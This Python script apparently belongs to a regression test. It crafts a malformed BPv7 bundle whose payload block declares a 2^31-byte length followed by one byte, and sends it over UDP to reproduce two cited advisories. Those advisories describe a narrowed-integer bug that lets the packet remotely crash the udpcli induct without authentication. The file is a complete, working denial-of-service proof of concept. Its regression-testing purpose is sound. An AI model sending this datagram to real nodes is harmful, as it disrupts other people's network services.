#!/usr/bin/env python3
#
# send_bundle.py HOST PORT [PAYLOAD_LEN_HEX]
#
# Send one UDP datagram carrying a BPv7 bundle whose payload block declares
# an oversized byte-string length while only one payload byte follows.  Used
# by the bpv7-payload-length-truncation regression test to reproduce
# GHSA-4438-9mff-3ppf / GHSA-5cjm-2fvg-46xm.
#
# The declared length defaults to 0x80000000 (2^31).  When that 64-bit length
# was narrowed to a 32-bit int in the acquisition parser it became INT_MIN;
# the negative value passed the "<= bytesBuffered" test and reached a memmove
# whose source pointer moved back 2 GiB and whose size was negative -- an
# unauthenticated remote crash of the udpcli induct.
#
# The datagram is sent from an ordinary ephemeral source port, so there is no
# peer relationship of any kind.

import socket
import struct
import sys


def build_bundle(payload_len):
    # CBOR indefinite-length array: the bundle.
    out = bytearray([0x9f])

    # Primary block: CBOR array(8) -- version, flags, crc-type, dest, src,
    # report-to, creation timestamp, lifetime.  No CRC, not fragmented.
    out += bytes([0x88])
    out += bytes([0x07])                    # version 7
    out += bytes([0x00])                    # bundle processing flags
    out += bytes([0x00])                    # CRC type 0 (none)
    out += bytes([0x82, 0x02, 0x82, 0x01, 0x01])  # dest ipn:1.1 = [2,[1,1]]
    out += bytes([0x82, 0x02, 0x82, 0x01, 0x02])  # src  ipn:1.2 = [2,[1,2]]
    out += bytes([0x82, 0x02, 0x82, 0x01, 0x02])  # report-to ipn:1.2
    out += bytes([0x82, 0x00, 0x00])        # creation timestamp [0,0]
    out += bytes([0x00])                    # lifetime 0

    # Payload block: CBOR array(5) -- type, number, flags, crc-type, data.
    out += bytes([0x85])
    out += bytes([0x01])                    # block type 1 (payload)
    out += bytes([0x01])                    # block number 1
    out += bytes([0x00])                    # block processing flags
    out += bytes([0x00])                    # CRC type 0 (none)
    # Byte string whose declared length is payload_len, encoded as a 4-byte
    # (0x5a) CBOR uint when it fits, otherwise an 8-byte (0x5b) CBOR uint.
    if payload_len <= 0xFFFFFFFF:
        out += bytes([0x5a]) + struct.pack(">I", payload_len)
    else:
        out += bytes([0x5b]) + struct.pack(">Q", payload_len)
    out += bytes([0xff])                    # one buffered payload byte

    # No closing break: the parser records the declared length and processes
    # the single buffered byte before it ever looks for the terminator.
    return bytes(out)


def main():
    if len(sys.argv) not in (3, 4):
        sys.stderr.write("usage: send_bundle.py HOST PORT [PAYLOAD_LEN_HEX]\n")
        return 1

    host = sys.argv[1]
    port = int(sys.argv[2])
    payload_len = int(sys.argv[3], 16) if len(sys.argv) == 4 else 0x80000000

    datagram = build_bundle(payload_len)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sent = sock.sendto(datagram, (host, port))
        if sent != len(datagram):
            sys.stderr.write(
                "short send: asked %d, sent %d\n" % (len(datagram), sent))
            return 1
    finally:
        sock.close()

    sys.stderr.write("sent %d-byte bundle, declared payload length 0x%x\n"
                     % (len(datagram), payload_len))
    return 0


if __name__ == "__main__":
    sys.exit(main())
